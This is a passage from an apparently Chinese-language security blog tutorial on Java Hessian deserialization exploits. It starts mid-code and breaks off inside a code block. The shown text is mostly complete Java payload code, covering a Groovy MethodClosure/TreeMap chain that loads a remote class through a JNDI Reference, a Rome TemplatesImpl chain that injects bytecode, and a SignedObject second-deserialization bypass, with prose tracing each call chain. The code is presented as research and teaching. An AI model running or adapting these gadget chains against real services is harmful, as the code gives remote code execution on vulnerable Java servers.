</span><br><span class="line">        hessianOutput.setSerializerFactory(serializerFactory);  </span><br><span class="line">        hessianOutput.writeObject(object);  </span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Hessian_unserialize</span><span class="params">(String obj)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">byte</span>[] code=Base64.getDecoder().decode(obj);  </span><br><span class="line">        ByteArrayInputStream byteArrayInputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(code);  </span><br><span class="line">        HessianInput hessianInput=<span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);  </span><br><span class="line">        hessianInput.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String field, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">        Field dfield=object.getClass().getDeclaredField(field);  </span><br><span class="line">        dfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        dfield.set(object,value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104184419709.png" class="">
<p>成功弹出计算器，但是可以看到Payload中出现了一个HotSwappableTargetSource方法这是为什么呢？其实是为了绕过前面的hash那里的判断具体是因为什么可以参考：<br>
<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/dbT8_O3o9BbCKcg-ecGMgg">https://mp.weixin.qq.com/s/dbT8_O3o9BbCKcg-ecGMgg</a><br>
我自己的理解是因为这个类他存在equals方法</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104191416009.png" class="">
<p>并且这里的target是可控的</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104191446748.png" class="">
<h2 id="Groovy链">Groovy链</h2>
<p>环境依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.groovy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="调用链分析-3">调用链分析</h3>
<p>这条链子的关键点在MethodClosure这个类中的docall方法</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104193248159.png" class="">
<p>再来看看他的构造方法</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104193329595.png" class="">
<p>可以看到接收两个参数一个object任意对象一个字符串方法，在结合上面的doCall方法这里很容易能看出来就是可以调用任意对象的任意方法</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104193522153.png" class="">
<p>并且参数也是可控的。那这里就去需要找一下谁会调用doCall方法并且是可控的找到Closure类的call方法调用doCall方法</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104193914317.png" class="">
<p>这里是通过反射调用的，再去找一下谁调用了call方法，找到了ConvertedClosure类里面的invokeCustom方法</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104194048298.png" class="">
<p>并且这里的getDelegate是可控的师傅直接看ConversionHandler类的构造方法我就不贴图了，那这个invokeCustom方法又是在哪里被调用的呢？</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104194501959.png" class="">
<p>在它的父类里的invoke方法中会调用这里，所以现在需要找一个动态代理的形式来进行触发并且调用Resin链的后半段ContinuationDirContext类中的getTargetContext方法完成链子的触发。<br>
所以现在需要找到一个可以触发前半段链的入口，这里只能用TreeMap类原因参考<br>
<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/daciyp4xHqbEy9drMnKizg">https://mp.weixin.qq.com/s/daciyp4xHqbEy9drMnKizg</a><br>
<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13345?time__1311=GqmxuiDQ5Cq0HRx%2BhODcDRxvbSh27bD#toc-7">https://xz.aliyun.com/t/13345?time__1311=GqmxuiDQ5Cq0HRx%2BhODcDRxvbSh27bD#toc-7</a></p>
<p>记录下Payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.*;  </span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.ConvertedClosure;  </span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">import</span> java.util.TreeMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Groovy</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;  </span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Exp&quot;</span>, <span class="string">&quot;Exp&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">CannotProceedException</span> <span class="variable">cpe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CannotProceedException</span>();  </span><br><span class="line">    cpe.setResolvedObj(reference);  </span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationDirContext&quot;</span>);  </span><br><span class="line">    Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(CannotProceedException.class,Hashtable.class);  </span><br><span class="line">    declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">c1</span> <span class="operator">=</span> declaredConstructor.newInstance(cpe, <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;());  </span><br><span class="line">  </span><br><span class="line">    <span class="type">MethodClosure</span> <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(c1,<span class="string">&quot;listBindings&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">ConvertedClosure</span> <span class="variable">convertedClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConvertedClosure</span>(methodClosure, <span class="string">&quot;compareTo&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Proxy.newProxyInstance(convertedClosure.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Comparable.class&#125;, convertedClosure);  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; e = Class.forName(<span class="string">&quot;java.util.TreeMap$Entry&quot;</span>);  </span><br><span class="line">    Constructor&lt;?&gt; declaredConstructor1 = e.getDeclaredConstructor(Object.class, Object.class, e);  </span><br><span class="line">    declaredConstructor1.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">a</span> <span class="operator">=</span> declaredConstructor1.newInstance(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>, <span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">    Constructor&lt;?&gt; declaredConstructor2 = e.getDeclaredConstructor(Object.class, Object.class, e);  </span><br><span class="line">    declaredConstructor2.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> declaredConstructor2.newInstance(o, <span class="number">2</span>, a);  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; t = Class.forName(<span class="string">&quot;java.util.TreeMap&quot;</span>);  </span><br><span class="line">    <span class="type">TreeMap</span> <span class="variable">treeMap</span> <span class="operator">=</span> (TreeMap) t.newInstance();  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> t.getDeclaredField(<span class="string">&quot;size&quot;</span>);  </span><br><span class="line">    size.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    size.set(treeMap,<span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">modCount</span> <span class="operator">=</span> t.getDeclaredField(<span class="string">&quot;modCount&quot;</span>);  </span><br><span class="line">    modCount.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    modCount.set(treeMap,<span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">root</span> <span class="operator">=</span> t.getDeclaredField(<span class="string">&quot;root&quot;</span>);  </span><br><span class="line">    root.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    root.set(treeMap,a);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">right</span> <span class="operator">=</span> e.getDeclaredField(<span class="string">&quot;right&quot;</span>);  </span><br><span class="line">    right.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    right.set(a,o1);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">byte</span>[] serialize = serialize(treeMap);  </span><br><span class="line">    unSerialize(serialize);  </span><br><span class="line">  </span><br><span class="line">   &#125;  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">    <span class="type">Hessian2Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);  </span><br><span class="line">    output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);  </span><br><span class="line">    output.writeObject(obj);  </span><br><span class="line">    output.flush();  </span><br><span class="line">    <span class="type">byte</span>[] bytes = baos.toByteArray();  </span><br><span class="line">    <span class="keyword">return</span> bytes;  </span><br><span class="line">   &#125;  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unSerialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">    <span class="type">Hessian2Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);  </span><br><span class="line">    input.readObject();  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104195944414.png" class="">
<p>成功弹出</p>
<h2 id="TemplatesImpl-SignedObject二次反序列化">TemplatesImpl+SignedObject二次反序列化</h2>
<p>使用于在不出网的场景下使用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_TemplatesImpl_SignedObject</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Hessian_stu/src/main/java/Exp.class&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);  </span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(TemplatesImpl.class,templatesimpl);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(objectBean,<span class="string">&quot;1&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] payload = Hessian2_Serial(hashMap);  </span><br><span class="line">        Hessian2_Deserial(payload);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] Hessian2_Serial(Object o) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);  </span><br><span class="line">        hessian2Output.writeObject(o);  </span><br><span class="line">        hessian2Output.flushBuffer();  </span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Hessian2_Deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> hessian2Input.readObject();  </span><br><span class="line">        <span class="keyword">return</span> o;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class&lt;?&gt; nodeC;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));  </span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        <span class="keyword">return</span> s;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正常我们使用Rome结合TemplatesImpl进行利用会发现利用不成功这是为什么呢？</p>
<p>这里其实是由于TemplatesImpl类中被<code>transient</code>修饰的<code>_tfactory</code>属性无法被序列化，进而导致TemplatesImpl类无法初始化</p>
<p>那么为什么我们之前使用Java原生的反序列化时不会报错呢？</p>
<p>这是因为如果在反序列化时重写readObject的类会自动调用重写的readObject方法，看一下TemplatesImpl的readObject方法</p>
<img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104204344810.png" class="">
<p>可以看到它手动new 了一个TransformerFactoryImpl对象给_tfactory。如何绕过呢，就是结合SignedObject进行二次反序列化即可绕过因为SignedObject中的readObject是java原生的，具体原理参考<a href="https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">二次反序列化</a>直接给出Payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;  </span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;  </span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.security.*;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_TemplatesImpl_SignedObject</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Hessian_stu/src/main/java/Exp.class&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);  </span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);  </span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);  </span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);  </span><br><span class="line">  </span><br><span class="line">        KeyPairGenerator keyPairGenerator;  </span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);  </span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);  </span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();  </span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();  </span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException,privateKey,signingEngine);  </span><br><span 